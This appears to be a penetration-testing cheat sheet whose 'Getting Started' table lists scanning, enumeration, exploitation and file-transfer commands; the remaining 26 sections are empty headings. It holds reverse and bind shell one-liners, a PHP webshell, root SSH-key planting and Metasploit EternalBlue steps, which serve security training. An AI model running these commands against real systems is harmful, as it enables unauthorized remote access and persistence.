# Table of Contents

- [Introduction](#introduction)
  - [1. Penetration Testing Process](#1-penetration-testing-process)
  - [2. Getting Started](#2-getting-started)
- [Reconnaissance, Enumeration & Attack Planning](#reconnaissance-enumeration--attack-planning)
  - [3. Network Enumeration with Nmap](#3-network-enumeration-with-nmap)
  - [4. Footprinting](#4-footprinting)
  - [5. Information Gathering - Web Edition](#5-information-gathering---web-edition)
  - [6. Vulnerability Assessment](#6-vulnerability-assessment)
  - [7. File Transfers](#7-file-transfers)
  - [8. Shells & Payloads](#8-shells--payloads)
  - [9. Using the Metasploit Framework](#9-using-the-metasploit-framework)
- [Exploitation & Lateral Movement](#exploitation--lateral-movement)
  - [10. Password Attacks](#10-password-attacks)
  - [11. Attacking Common Services](#11-attacking-common-services)
  - [12. Pivoting, Tunneling, and Port Forwarding](#12-pivoting-tunneling-and-port-forwarding)
  - [13. Active Directory Enumeration & Attacks](#13-active-directory-enumeration--attacks)
- [Web Exploitation](#web-exploitation)
  - [14. Using Web Proxies](#14-using-web-proxies)
  - [15. Attacking Web Applications with Ffuf](#15-attacking-web-applications-with-ffuf)
  - [16. Login Brute Forcing](#16-login-brute-forcing)
  - [17. SQL Injection Fundamentals](#17-sql-injection-fundamentals)
  - [18. SQLMap Essentials](#18-sqlmap-essentials)
  - [19. Cross-Site Scripting (XSS)](#19-cross-site-scripting-xss)
  - [20. File Inclusion](#20-file-inclusion)
  - [21. File Upload Attacks](#21-file-upload-attacks)
  - [22. Command Injections](#22-command-injections)
  - [23. Web Attacks](#23-web-attacks)
  - [24. Attacking Common Applications](#24-attacking-common-applications)
- [Post-Exploitation](#post-exploitation)
  - [25. Linux Privilege Escalation](#25-linux-privilege-escalation)
  - [26. Windows Privilege Escalation](#26-windows-privilege-escalation)
- [Reporting & Capstone](#reporting--capstone)
  - [27. Documentation & Reporting](#27-documentation--reporting)
  - [28. Attacking Enterprise Networks](#28-attacking-enterprise-networks)



<a id="introduction"></a>
# Introduction

<a id="1-penetration-testing-process"></a>
## 1. Penetration Testing Processes

<a id="2-getting-started"></a>
## 2. Getting Started
### Basic Tools

| **Command**   | **Description**   |
| --------------|-------------------|
| **Service Scanning** |
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP secret string |
| **Web Enumeration** |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Run a directory scan on a website |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | List details about the webserver/certificates |
| `curl 10.10.10.121/robots.txt` | List potential directories in `robots.txt` |
| `ctrl+U` | View page source (in Firefox) |
| **Public Exploits** |
| `searchsploit openssh 7.2` | Search for public exploits for a web application |
| `msfconsole` | MSF: Start the Metasploit Framework |
| `search exploit eternalblue` | MSF: Search for public exploits in MSF |
| `use exploit/windows/smb/ms17_010_psexec` | MSF: Start using an MSF module |
| `show options` | MSF: Show required options for an MSF module |
| `set RHOSTS 10.10.10.40` | MSF: Set a value for an MSF module option |
| `check` | MSF: Test if the target server is vulnerable |
| `exploit` | MSF: Run the exploit on the target server is vulnerable |
| **Using Shells** |
| `nc -lvnp 1234` | Start a `nc` listener on a local port |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f` | Another command to send a reverse shell from the remote server |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f` | Start a bind shell on the remote server |
| `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
| **Privilege Escalation** |
| `./linpeas.sh` | Run `linpeas` script to enumerate remote server |
| `sudo -l` | List available `sudo` privileges |
| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
| `ssh-keygen -f key` | Create a new SSH key |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
| **Transferring Files** |
| `python3 -m http.server 8000` | Start a local webserver |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download a file on the remote server from our local machine |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download a file on the remote server from our local machine |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0` | Convert a file to `base64` |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell` | Convert a file from `base64` back to its orig |
| `md5sum shell` | Check the file's `md5sum` to ensure it converted correctly |                                |

<a id="reconnaissance-enumeration--attack-planning"></a>
## Reconnaissance, Enumeration & Attack Planning

<a id="3-network-enumeration-with-nmap"></a>
### 3. Network Enumeration with Nmap

<a id="4-footprinting"></a>
### 4. Footprinting

<a id="5-information-gathering---web-edition"></a>
### 5. Information Gathering - Web Edition

<a id="6-vulnerability-assessment"></a>
### 6. Vulnerability Assessment

<a id="7-file-transfers"></a>
### 7. File Transfers

<a id="8-shells--payloads"></a>
### 8. Shells & Payloads

<a id="9-using-the-metasploit-framework"></a>
### 9. Using the Metasploit Framework

<a id="exploitation--lateral-movement"></a>
## Exploitation & Lateral Movement

<a id="10-password-attacks"></a>
### 10. Password Attacks

<a id="11-attacking-common-services"></a>
### 11. Attacking Common Services

<a id="12-pivoting-tunneling-and-port-forwarding"></a>
### 12. Pivoting, Tunneling, and Port Forwarding

<a id="13-active-directory-enumeration--attacks"></a>
### 13. Active Directory Enumeration & Attacks

<a id="web-exploitation"></a>
## Web Exploitation

<a id="14-using-web-proxies"></a>
### 14. Using Web Proxies

<a id="15-attacking-web-applications-with-ffuf"></a>
### 15. Attacking Web Applications with Ffuf

<a id="16-login-brute-forcing"></a>
### 16. Login Brute Forcing

<a id="17-sql-injection-fundamentals"></a>
### 17. SQL Injection Fundamentals

<a id="18-sqlmap-essentials"></a>
### 18. SQLMap Essentials

<a id="19-cross-site-scripting-xss"></a>
### 19. Cross-Site Scripting (XSS)

<a id="20-file-inclusion"></a>
### 20. File Inclusion

<a id="21-file-upload-attacks"></a>
### 21. File Upload Attacks

<a id="22-command-injections"></a>
### 22. Command Injections

<a id="23-web-attacks"></a>
### 23. Web Attacks

<a id="24-attacking-common-applications"></a>
### 24. Attacking Common Applications

<a id="post-exploitation"></a>
## Post-Exploitation

<a id="25-linux-privilege-escalation"></a>
### 25. Linux Privilege Escalation

<a id="26-windows-privilege-escalation"></a>
### 26. Windows Privilege Escalation

<a id="reporting--capstone"></a>
## Reporting & Capstone

<a id="27-documentation--reporting"></a>
### 27. Documentation & Reporting

<a id="28-attacking-enterprise-networks"></a>
### 28. Attacking Enterprise Networks
